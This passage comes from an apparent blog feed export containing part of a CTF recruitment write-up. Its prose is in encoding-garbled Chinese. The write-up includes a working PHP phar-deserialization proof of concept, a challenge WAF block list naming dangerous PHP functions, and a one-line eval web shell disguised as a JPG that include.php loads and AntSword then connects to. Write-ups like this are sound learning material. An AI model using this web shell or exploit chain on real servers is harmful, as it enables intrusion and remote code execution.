<span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;   <span class="comment">//Do you know &#x27;Php ARchive&#x27;?</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰unserilize()ï¼Œå†åŠ ä¸Šä¸Šä¼ æ–‡ä»¶ï¼Œè€ƒå¯Ÿpharååºåˆ—åŒ–</p><p>åŸç†ï¼š</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450da4cece0.png)</p><p>è¿™é‡Œå…ˆè®°å½•ä¸€ä¸‹ä¸ºä»€ä¹ˆç¬¬ä¸€æ¬¡æˆ‘æ²¡èƒ½æˆåŠŸ</p><p>ç¬¬ä¸€æ¬¡çš„poc:</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450da5b107b.png)</p><p>é”™åœ¨èµ‹å€¼ä¸èƒ½ä»¥$cnss()çš„å½¢å¼ï¼Œå› ä¸ºéƒ½è¦èµ‹å€¼å¸¸æ•°ï¼ï¼</p><p>æˆåŠŸçš„POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CNSS</span>(<span class="string">&#x27;cnss&#x27;</span>);</span><br><span class="line"><span class="variable">$cnss</span> =<span class="keyword">new</span> <span class="title class_">CN55</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&#x27;6&#x27;</span>);</span><br><span class="line"><span class="variable">$s</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>]=<span class="variable">$cnss</span>;</span><br><span class="line"><span class="variable">$cnss</span>-&gt;params[<span class="string">&#x27;key&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$cn</span>-&gt;name=<span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$cn</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;leon.txt&quot;</span>, <span class="string">&quot;leon&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flagäº†</p><p><img src="https://bu.dusays.com/2023/11/03/65450da6af0f2.png"></p><h3 id="ğŸš“-can-can-need-shell"><a href="#ğŸš“-can-can-need-shell" class="headerlink" title="ğŸš“ can can need shell"></a>ğŸš“ can can need shell</h3><p>åœ¨å¤§ä½¬çš„ä¸æ–­æç¤ºä¸‹æ•´å‡ºæ¥äº†ï¼Œèœé¸Ÿæˆé•¿å…¨é è€å¸ˆå‚…ä»¬ğŸ˜­</p><p>æ ¹æ®æç¤ºåŠ &#x2F;admin</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450da76eb70.png)</p><p>æç¤ºäº†è´¦å·å¯†ç éƒ½æ˜¯admin</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450da84afcc.png)</p><p>è¿›å…¥ç®¡ç†å‘˜åå°ï¼Œè¿™é¢˜è€ƒå¯Ÿlavarelæ¨¡æ¿æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ‰¾åˆ°ä¸‹å›¾çš„æ•™ç¨‹ï¼ŒåŸç†æ˜¯burpæŠ“åŒ…jpgé©¬ï¼Œç„¶ååç¼€åŠ .phpèšå‰‘è¿æ¥ï¼Œä½†æ˜¯è¿™é¢˜æœ‰waf</p><p><img src="https://bu.dusays.com/2023/11/03/65450db028956.png"></p><p>waf:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$dangerous</span> = <span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;serialize&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;write&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;ch&#x27;</span>,<span class="string">&#x27;scandir&#x27;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;call&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$dangerous</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">                <span class="variable">$res</span> = <span class="title function_ invoke__">stristr</span>(<span class="variable">$line</span>,<span class="variable">$value</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$res</span> != <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">        retur</span><br><span class="line">n <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¦äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ²¡ç¦ç”¨å•å¼•å·ï¼Œåœ¨å¤§ä½¬çš„æç¤ºä¸‹è€ƒè™‘includeæ–‡ä»¶åŒ…å«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;1.jpg&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.jpg</span><br><span class="line"> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;leon&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>éƒ½ä¸Šä¼ åï¼Œèšå‰‘è¿æ¥ xxx&#x2F;xxxx&#x2F;include.php </p><p>å°±æˆäº†</p><h3 id="9-ğŸ­-EzPollution-pre"><a href="#9-ğŸ­-EzPollution-pre" class="headerlink" title="9.ğŸ­ EzPollution_pre"></a>9.ğŸ­ EzPollution_pre</h3><p>è¿™é¢˜æ³¨æ„nodejså®¹å™¨ä½¿ç”¨ä¸€æ¬¡å°±æŸåäº†ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°è·‘é€šï¼Œé‡å¯ä¼šæ–¹ä¾¿ä¸€ç‚¹</p><p>ç„¶åæ ¹æ®åŸå‹é“¾æ±¡æŸ“çš„åŸç†åƒå›¾ä¸­è¿™æ ·post,æ³¨æ„è¦ç”¨jsçš„å‡½æ•°æŠŠflagç»™catå‡ºæ¥</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450db13d87c.png)</p><p>CNSS{v2ry_ea5y_N0dejs}</p><p><img src="https://bu.dusays.com/2023/11/03/65450db20075c.png"></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="1-ğŸ“¦-Bin-Guideline"><a href="#1-ğŸ“¦-Bin-Guideline" class="headerlink" title="1.ğŸ“¦ Bin Guideline"></a>1.ğŸ“¦ Bin Guideline</h3><p>æ— è¯å¯è¯´</p><h3 id="2-ğŸ˜-é‚£ä¸ªå¥³äºº"><a href="#2-ğŸ˜-é‚£ä¸ªå¥³äºº" class="headerlink" title="2.ğŸ˜ é‚£ä¸ªå¥³äºº"></a>2.ğŸ˜ é‚£ä¸ªå¥³äºº</h3><p>æ‰“å¼€å°±é€</p><h3 id="3-ğŸ˜¢-æˆ‘çš„flagç¢äº†ä¸€åœ°"><a href="#3-ğŸ˜¢-æˆ‘çš„flagç¢äº†ä¸€åœ°" class="headerlink" title="3.ğŸ˜¢ æˆ‘çš„flagç¢äº†ä¸€åœ°"></a>3.ğŸ˜¢ æˆ‘çš„flagç¢äº†ä¸€åœ°</h3><p>F5</p><p>æ ¹æ®æç¤ºæ‰“å¼€Stringçª—å£</p><p><img src="https://bu.dusays.com/2023/11/03/65450db31ed75.png"></p><p>ç¬¬äºŒæ®µåœ¨functionæ‰¾åˆ°</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450db40b413.png)</p><p>ç¬¬ä¸‰æ®µå³é”®æŸ¥çœ‹å¼•ç”¨å›¾</p><p><img src="https://bu.dusays.com/2023/11/03/65450db5091b5.png"></p><p>æ‰¾åˆ°func718</p><p><img src="https://bu.dusays.com/2023/11/03/65450db5eb556.png"></p><p><img src="https://bu.dusays.com/2023/11/03/65450db6dd0c6.png"></p><p>æ‹¼æ¥ä¸€ä¸‹CNSS{My_fl@g_h4s_br0ken_4parT_ Bu7_Y0u_c@n_f1x_1t!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CNSS-Recruit-2023-Writeup&quot;&gt;&lt;a href=&quot;#CNSS-Recruit-2023-Writeup&quot; class=&quot;headerlink&quot; title=&quot;CNSS Recruit 2023 Writeup&quot;&gt;&lt;/a&gt;CNSS Recrui</summary>
      
    
    
    
    <category term="writeup" scheme="https://foreon.github.io/categories/writeup/"/>
    
    
    <category term="ctf" scheme="https://foreon.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢</title>
    <link href="https://foreon.github.io/posts/51727.html"/>
    <id>https://foreon.github.io/posts/51727.html</id>
    <published>2023-11-02T12:15:27.000Z</published>
    <updated>2023-11-03T15:41:37.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼"><a href="#æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼" class="headerlink" title="æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼"></a>æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼</h1><p><strong>æ­¤åšå®¢è¯ç”Ÿäº<mark>2023å¹´11æœˆ2æ—¥</mark>ã€‚</strong></p><p><strong>ä»Šåæˆ‘åº”è¯¥ä¼šæ›´æ–°ä¸€äº›éšç¬”ã€ctfæ¯”èµ›writeupå’Œå­¦ä¹ æ€»ç»“ã€‚</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼&quot;&gt;&lt;a href=&quot;#æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼&quot; class=&quot;headerlink&quot; title=&quot;æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼&quot;&gt;&lt;/a&gt;æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;æ­¤åšå®¢è¯ç”Ÿäº&lt;mark&gt;2023å¹´11æœˆ2æ—¥&lt;/mark&gt;ã€‚&lt;/strong</summary>
      
    
    
    
    <category term="éšç¬”" scheme="https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="æ‰“æ‹›å‘¼" scheme="https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"/>
    
  </entry>
  
</feed>
